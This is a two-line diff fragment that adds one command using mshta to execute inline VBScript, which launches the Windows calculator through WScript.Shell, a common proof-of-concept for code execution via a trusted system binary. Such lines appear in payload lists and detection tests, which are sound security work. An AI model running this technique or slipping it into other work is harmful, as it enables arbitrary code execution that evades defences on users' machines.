@@ -1,0 +1,2 @@
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")
+
